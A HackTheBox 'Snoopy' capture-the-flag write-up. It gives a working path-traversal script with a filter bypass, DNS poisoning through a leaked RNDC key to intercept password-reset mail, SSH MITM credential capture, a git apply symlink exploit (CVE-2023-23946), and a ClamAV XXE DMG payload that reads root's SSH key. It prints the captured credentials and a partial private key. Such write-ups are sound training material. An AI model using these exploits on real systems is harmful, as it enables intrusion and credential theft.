---
title: "HackTheBox - Snoopy"
layout: "post"
categories: "Linux"
tags: ["HackTheBox", "Writeup", "Web", "Path Traversal", "DNS", "MiTM", "ClamAV"]
---

## Port Scanning

Firstly, let's do an nmap scan of the TCP ports:

```bash
❯ nmap -sCV 10.10.11.212 -Pn --open -T5 -oN nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-12 16:45 CEST
Nmap scan report for 10.10.11.212
Host is up (0.024s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The remote server host 3 services:

- SSH server (OpenSSH 8.9)
- DNS server (Bind9)
- HTTP server (nginx 1.18

## DNS zone transfer

We can perform DNS zone transfer to get multiple subdomains:

```py
❯ dig axfr @10.10.11.212 snoopy.htb

; <<>> DiG 9.18.0 <<>> axfr @10.10.11.212 snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.        86400    IN    SOA    ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.        86400    IN    NS    ns1.snoopy.htb.
snoopy.htb.        86400    IN    NS    ns2.snoopy.htb.
mattermost.snoopy.htb.    86400    IN    A    172.18.0.3
mm.snoopy.htb.        86400    IN    A    127.0.0.1
ns1.snoopy.htb.        86400    IN    A    10.0.50.10
ns2.snoopy.htb.        86400    IN    A    10.0.51.10
postgres.snoopy.htb.    86400    IN    A    172.18.0.2
provisions.snoopy.htb.    86400    IN    A    172.18.0.4
www.snoopy.htb.        86400    IN    A    127.0.0.1
snoopy.htb.        86400    IN    SOA    ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 20 msec
;; SERVER: 10.10.11.212#53(10.10.11.212) (TCP)
;; WHEN: Tue Sep 12 16:49:22 CEST 2023
;; XFR size: 11 records (messages 1, bytes 325)
```

DNS zone transfer is the principle of send AXFR request at the DNS server, it's no need authentication to get DNS records.

## Web Enumeration

On the contact page of the SnoopySec website, we can see a interesting warning: "Attention:  As we migrate DNS records to our new domain please be advised that our mailserver 'mail.snoopy.htb' is currently offline.".

![](/assets/posts/2023-09-19-htb-snoopy/website_mail_snoopy_htb.png)

Now we can add all subdomains in our `/etc/hosts` file:

```bash
echo '10.10.11.212	snoopy.htb	mattermost.snoopy.htb	mm.snoopy.htb	postgres.snoopy.htb	provisions.snoopy.htb	mail.snoopy.htb' | sudo tee -a /etc/hosts
```

By crawling the HTML href attributes of the website's index.html, we discover an interesting endpoint and HTTP parameter (`/download?file=`):

```bash
❯ galer -s -u http://snoopy.htb/
http://snoopy.htb/assets/img/favicon.png
http://snoopy.htb/assets/img/apple-touch-icon.png
https://fonts.googleapis.com/
https://fonts.gstatic.com/
https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,600;1,700&family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&family=Raleway:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap
http://snoopy.htb/assets/vendor/bootstrap/css/bootstrap.min.css
http://snoopy.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
http://snoopy.htb/assets/vendor/aos/aos.css
http://snoopy.htb/assets/vendor/glightbox/css/glightbox.min.css
http://snoopy.htb/assets/vendor/swiper/swiper-bundle.min.css
http://snoopy.htb/assets/vendor/remixicon/remixicon.css
http://snoopy.htb/assets/css/main.css
http://snoopy.htb/index.html
http://snoopy.htb/about.html
http://snoopy.htb/#services-list
http://snoopy.htb/team.html
http://snoopy.htb/contact.html
http://snoopy.htb/download
http://snoopy.htb/download?file=announcement.pdf
http://snoopy.htb/#
http://snoopy.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
http://snoopy.htb/assets/vendor/aos/aos.js
http://snoopy.htb/assets/vendor/glightbox/js/glightbox.min.js
http://snoopy.htb/assets/vendor/swiper/swiper-bundle.min.js
http://snoopy.htb/assets/vendor/isotope-layout/isotope.pkgd.min.js
http://snoopy.htb/assets/vendor/php-email-form/validate.js
http://snoopy.htb/assets/js/main.js
```

Let's try to download the proposed PDF file to view the content:

```bash
❯ wget -q 'http://snoopy.htb/download?file=announcement.pdf' -O output
❯ file !$
output: Zip archive data, at least v2.0 to extract, compression method=deflate
❯ unzip output
Archive:  output
  inflating: press_package/announcement.pdf
```

The website compress the asked file in ZIP file and send it into the client.

### Path Traversal & Bypass filter

After multiple tests, we can discover a path traversal:

![](/assets/posts/2023-09-19-htb-snoopy/burp_screen_path_traversal.png)

The backend use a simple filter for the file HTTP parameter input, we can guess that the filter matches with this code line: `$content = preg_replace('/\.\.\//', '', $file);`. The regex in `preg_replace` PHP function is used to replace "../" pattern to empty string.

We can develop a little script to exploit this path traversal with the unzip part:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from zipfile import BadZipFile
import requests, zipfile

while True:
   asked_file = input("File name: ")
   file = "....//....//....//....//....//....//....//....//..../" + asked_file
   url = f"http://snoopy.htb/download?file={file}"
   r = requests.get(url)
   try:
      with open('cat.zip', 'wb') as f:
         f.write(r.content)
      with zipfile.ZipFile('cat.zip', 'r') as rez:
         rez.extractall('.')
      with open(f'press_package{asked_file}', 'r') as f:
         print(f.read())
   except BadZipFile:
      continue
```

After multiples enumerations of filesystem, we remember that there is a DNS server and we known that the subdomain `mail.snoopy.htb` is offline. Moreover Mattermost have a password reset feature with a reset link sended by mail. We can grab the RNDC key to authenticate into the DNS server:

```bash
❯ python3 /tmp/exploit.py
File name: /etc/bind/named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

## Mattermost's account takerover

Let's try to reset password in Mattermost of this users:

```bash
❯ python3 exploit.py | grep '/bin/bash'
/etc/passwd
File name: root:x:0:0:root:/root:/bin/bash
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
```

### Poison the DNS

After getting the RNDC key of the Bind9 DNS server with can create A record and listen the trafic

```bash
❯ nsupdate -v -k rndc.key
> server snoopy.htb
> update add mail.snoopy.htb 86400 a 10.10.16.X
> send
```

Check if the record is correctly set:

```bash
❯ dig +noall +answer @10.10.11.212 mail.snoopy.htb A
mail.snoopy.htb.	86400	IN	A	10.10.16.X
```

Let's remember about the mattermost subdomain, in this website we can send password reset mail:

![](/assets/posts/2023-09-19-htb-snoopy/password_reset_mattermost.png)

```bash
❯ sudo /usr/lib/python3.10/smtpd.py -c DebuggingServer 10.10.16.X:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'Subject: [Mattermost] Reset your password'
b'Content-Transfer-Encoding: 8bit'
b'Date: Tue, 19 Sep 2023 13:07:01 +0000'
b'Precedence: bulk'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'Message-ID: <b8yfrmn91rhom48z-1695128821@mm.snoopy.htb>'
b'To: sbrown@snoopy.htb'
b'Auto-Submitted: auto-generated'
b'Content-Type: multipart/alternative;'
b' boundary=b4e63e7545a13ebb85cb297e57478e02e24cca1f9f2a8aa97a80ab047690'
b'X-Peer: 10.10.11.212'
b''
b'--b4e63e7545a13ebb85cb297e57478e02e24cca1f9f2a8aa97a80ab047690'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dtnir9='
b'h37ubdq8p8shfksr1qns1ti13aa7yp54yjxi4xpukrm3yxwjogz8cktz4sz )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
b'Need help or have questions? Email us at support@snoopy.htb ( support@snoop='
b'y.htb )'
b''
b'=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA='
b', 94301'
b'--b4e63e7545a13ebb85cb297e57478e02e24cca1f9f2a8aa97a80ab047690'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/html; charset=UTF-8'
```

After have delete bad URL encode and smtpd.py format, we get a reset password link: `http://mm.snoopy.htb/reset_password_complete?token=tnir9h37ubdq8p8shfksr1qns1ti13aa7yp54yjxi4xpukrm3yxwjogz8cktz4sz`:

![](/assets/posts/2023-09-19-htb-snoopy/password_reset_success.png)

Now we can connect into Mattermost with sbrown user account.

## SSH MiTM

There is a custom command in the tchat:

![](/assets/posts/2023-09-19-htb-snoopy/server_provision_message.png)

We can see that we can force a IT staff to connect via SSH in 2222 port in any server that our choice:

![](/assets/posts/2023-09-19-htb-snoopy/server_provision_request.png)

We can use [ssh-mitm](https://github.com/ssh-mitm/ssh-mitm) to simulate SSH server in order to recover IT staff's SSH credentials by using MiTM (Man In The Middle) technique:

```bash
❯ ssh-mitm server --remote-host snoopy.htb --listen-port 2222
──────────────────────────────────────────────────────────────────── SSH-MITM - ssh audits made simple ─────────────────────────────────────────────────────────────────────
Version: 3.0.2
License: GNU General Public License v3.0
Documentation: https://docs.ssh-mitm.at
Issues: https://github.com/ssh-mitm/ssh-mitm/issues
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
generated temporary RSAKey key with 2048 bit length and fingerprints:
   MD5:25:f2:72:0c:45:c7:94:62:fd:89:5d:e0:bb:f8:0e:1d
   SHA256:rxjRHAp6Mn44VrRFuc8yYruPylPRI+UaQdm8EXhTa0E
   SHA512:1ChVRwgM7SYw47g5f9hdl1MiyPSzamkolcb4ZVwMou8SSGpPWXnW8HBH37VPAZjFFsuiTmqCLci1dq/eq8W/kA
listen interfaces 0.0.0.0 and :: on port 2222
───────────────────────────────────────────────────────────────────────── waiting for connections ──────────────────────────────────────────────────────────────────────────
[09/19/23 15:28:50] INFO     ℹ session
                             3272cb36-bd02-41fc-a23f-5d0a1792e3f0
                             created
                    INFO     ℹ client information:
                               - client version:
                             ssh-2.0-paramiko_3.1.0
                               - product name: Paramiko
                               - vendor url:  https://www.paramiko.org/
                             ⚠ client audit tests:
                               * client uses same server_host_key_algorithms
                             list for unknown and known hosts
                               * Preferred server host key algorithm: ssh-ed25519
[09/19/23 15:28:51] INFO     Remote authentication succeeded
                                     Remote Address: snoopy.htb:22
                                     Username: cbrown
                                     Password: sn00pedcr3dential!!!
                                     Agent: no agent
                    INFO     ℹ 3272cb36-bd02-41fc-a23f-5d0a1792e3f0
                             - local port forwading
                             SOCKS port: 33631
                               SOCKS4:
                                 * socat: socat
                             TCP-LISTEN:LISTEN_PORT,fork
                             socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,soc
                             sport=33631
                                 * netcat: nc -X 4 -x localhost:33631
                             address port
                               SOCKS5:
                                 * netcat: nc -X 5 -x localhost:33631
                             address port
                    INFO     got ssh command: ls -la
[09/19/23 15:28:52] INFO     ℹ 3272cb36-bd02-41fc-a23f-5d0a1792e3f0 - session started
                    INFO     got remote command: ls -la
[09/19/23 15:28:53] INFO     remote command 'ls -la' exited with code: 0
                    ERROR    Socket exception: Connection reset by peer (104)
                    INFO     ℹ session 3272cb36-bd02-41fc-a23f-5d0a1792e3f0 closed
```

We can connect via SSH protocol with this credentials `cbrown:sn00pedcr3dential!!!`:

```bash
❯ sshpass -p 'sn00pedcr3dential!!!' ssh cbrown@snoopy.htb
```

## Horizontal privilege escalation: Git sudo missconfiguration/CVE-2023-23946

Sudo permissions allow cbrown to execute `git apply -v` as sbrown with parameters which matches strings containing only upper and lower case letters, digits and dots at the end of the string:

```bash
cbrown@snoopy:~$ sudo -l
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
cbrown@snoopy:~$ git --version
git version 2.34.1
```

A vulnerability ([CVE-2023-23946](https://github.com/bruno-1337/CVE-2023-23946-POC)) was found in Git, especially prior to version 2.34.7. This security issue occurs when feeding a crafted input to `git apply`. A path outside the working tree can be overwritten by the user running `git apply`.

Just add our SSH public key in sbrown's authorized_keys file via this CVE:

```bash
cbrown@snoopy:/tmp$ mkdir repository
cbrown@snoopy:/tmp$ cd !$
cbrown@snoopy:/tmp/repository$ git init --quiet
cbrown@snoopy:/tmp/repository$ cat << END > x.patch
> diff --git a/symlink b/symlink2
> similarity index 100%
> rename from symlink
> rename to symlink2
> --
> diff --git /dev/null b/symlink2/cat
> new file mode 100644
> index 0000000..ef07ddc
> --- /dev/null
> +++ b/symlink2/authorized_keys
> @@ -0,0 +1 @@
> +ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxG1OZ8ZvsPXtkxpe/a4n6/KyOFcwttUZ5XEypkADTCENpXpGUXso7Iv+5bws5VzOuR4wBayLDJ2g8+j+D4m2s1UMm75iL5ZX77t/ZLiANI1YOSs+w1JR8r6LyYZUkTYyjcdsoVgAxhNUc0I+NkHZKhaNpd1n5wZNJYVb/G8v7An02vrx6dZT59dSY5n7O6j02nsrHNWK068BEcP06uqnv491rDKf70uo/iyY51dk/m01ebY4VrEbExaSbsI16/K3dwUYGrYaiG/hX+V808TyOibkKBsLKSxZ2EMl82vGj9S4KuYW1x+6SZGKJPetIjHfSpsnEBJs7EL95pUJ2GO9EQCdQGCZJYbDCIIr9osb0KuwnWJ8hO+wWbbeI5U4A2GiYMCQkcwKMBciRlt/nBKsbTByS0xwg5cxzwkrzPhjxjYQJbNWndJMJ69ZvLEtXM372NQ+gkWKYKL8YJbZp0k2hDXUS0QtQLoKDUBnOy9WGLH/4AD/UhU7oRVt45NzseU8= nuts@c
> END
cbrown@snoopy:/tmp/repository$ ln -s /home/sbrown/.ssh symlink
cbrown@snoopy:/tmp/repository$ chmod 777 .
cbrown@snoopy:/tmp/repository$ sudo -u sbrown /usr/bin/git apply -v x.patch
Checking patch symlink => symlink2...
Checking patch symlink2/authorized_keys...
Applied patch symlink => symlink2 cleanly.
Applied patch symlink2/authorized_keys cleanly.
```

Basically we can connect via SSH protocol with our SSH key:

```bash
❯ ssh -i .ssh/id_rsa sbrown@snoopy.htb
```

## Lateral privilege escalation: Clamscan sudo missconfiguration/CVE-2023-20052

Sudo permissions allow sbrown to execute clamscan as root with the argument `--debug` that take in parameter a file stocked in the `/home/sbrown/scanfiles/*` folder:

```bash
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
sbrown@snoopy:~$ clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```

A vulnerability ([CVE-2023-20052](https://github.com/nokn0wthing/CVE-2023-20052)) released in February 2023 about the DMG file parser of ClamAV versions 1.0.0 and earlier, 0.105.1 and earlier, and 0.103.7 and earlier could allow an unauthenticated, remote attacker to access sensitive information on an affected device. This vulnerability is due to enabling XML entity substitution that may result in XML external entity injection. An attacker could exploit this vulnerability by submitting a crafted DMG file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to leak bytes from any file that may be read by the ClamAV scanning process. ()

The [vulnerability fix](https://github.com/Cisco-Talos/clamav/commit/acf44eae4844557cf341614a9e41ab439e5e2258) in `/clamav/libclamav/dmg.c` file patch it by adding the `XML_PARSE_NOENT` flag from libxml2 library that enables the substitution of XML character entity references because the XML entity expansion can lead to XXE (XML External Entity Injection):

```c
@@ -207,8 +207,7 @@ int cli_scandmg(cli_ctx *ctx)
- #define DMG_XML_PARSE_OPTS ((1 << 1 | 1 << 11 | 1 << 16) | CLAMAV_MIN_XMLREADER_FLAGS)
+ #define DMG_XML_PARSE_OPTS ((XML_PARSE_NONET | XML_PARSE_COMPACT) | CLAMAV_MIN_XMLREADER_FLAGS)
```

We can download the PoC of CVE and generate a DMG file that contains a malicous XML property list which includes XML external entity that read the root's SSH key:

```bash
❯ git clone --quiet https://github.com/nokn0wthing/CVE-2023-20052.git && cd "$(basename "$_" .git)"
❯ sudo docker build -t cve-2023-20052 .
<...snip...>
Successfully built c1afd1e51a42
Successfully tagged cve-2023-20052:latest
❯ sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash
root@b68071f6c062:/exploit#
root@b68071f6c062:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
Total translation table size: 0
Total rockridge attributes bytes: 6784
Total directory bytes: 36864
Path table size(bytes): 240
Max brk space used 23000
125 extents written (0 MB)
Processing DDM...
No DDM! Just doing one huge blkx then...
run 0: sectors=500, left=500
Writing XML data...
Generating UDIF metadata...
Master checksum: a7d1e305
Writing out UDIF resource file...
Cleaning up...
Done
root@b68071f6c062:/exploit# bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

Let's transfer the crafted malicious DMG file in the server:

```bash
❯ docker cp 'b68071f6c062:/exploit/exploit.dmg' /tmp/exploit.dmg
❯ updog -d .
[+] Serving /tmp...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:9090
 * Running on http://10.100.214.193:9090
Press CTRL+C to quit
sbrown@snoopy:/tmp$ wget 10.10.16.X:9090/exploit.dmg -O /home/sbrown/scanfiles/exploit.dmg
```

Here XML plist's exploit content, globally it's contains a blkx key, any data encoded in base64 and identified by structure named "mish":

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>
<plist version="1.0">
<dict>
	<key>resource-fork</key>
	<dict>
		<key>&xxe;</key>
		<array>
			<dict>
				<key>Attributes</key>
				<string>0x0050</string>
				<key>Data</key>
				<data>
				bWlzaAAAAAEAAAAAAAAAAAAAAAAAAAH0AAAAAAAAAAAA
				AAII/////gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAIAAAAgyj9WuwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAACgAAABQAAAAAAAAAAAAAAAAAAAAAAAAH0AAAA
				AAAAAAAAAAAAAAGoM/////8AAAAAAAAAAAAAAfQAAAAA
				AAAAAAAAAAAAAagzAAAAAAAAAAA=
				</data>
				<key>ID</key>
				<string>0</string>
				<key>Name</key>
				<string>whole disk (unknown partition : 0)</string>
			</dict>
		</array>
		<key>cSum</key>
		<array>
			<dict>
				<key>Attributes</key>
				<string>0x0000</string>
				<key>Data</key>
				<data>
				AAEAAAAC8nAJyQ==
				</data>
				<key>ID</key>
				<string>0</string>
				<key>Name</key>
				<string></string>
			</dict>
		</array>
		<key>nsiz</key>
		<array>
			<dict>
				<key>Attributes</key>
				<string>0x0000</string>
				<key>Data</key>
				<data>
				PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRG
				LTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8v
				QXBwbGUgQ29tcHV0ZXIvL0RURCBQTElTVCAxLjAvL0VO
				IiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9w
				ZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9u
				PSIxLjAiPgo8ZGljdD4KCTxrZXk+YmxvY2stY2hlY2tz
				dW0tMjwva2V5PgoJPGludGVnZXI+LTIyNzUzODQ4Nzwv
				aW50ZWdlcj4KCTxrZXk+cGFydC1udW08L2tleT4KCTxp
				bnRlZ2VyPjA8L2ludGVnZXI+Cgk8a2V5PnZlcnNpb248
				L2tleT4KCTxpbnRlZ2VyPjY8L2ludGVnZXI+CjwvZGlj
				dD4KPC9wbGlzdD4K
				</data>
				<key>ID</key>
				<string>0</string>
				<key>Name</key>
				<string></string>
			</dict>
		</array>
		<key>plst</key>
		<array>
			<dict>
				<key>Attributes</key>
				<string>0x0050</string>
				<key>Data</key>
				<data>
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
				AAAAAAAAAAAA
				</data>
				<key>ID</key>
				<string>0</string>
				<key>Name</key>
				<string></string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

Now it's possible to run a scan with our exploit.dmg file input:

```bash
sbrown@snoopy:/tmp$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
<...snip...>
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
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
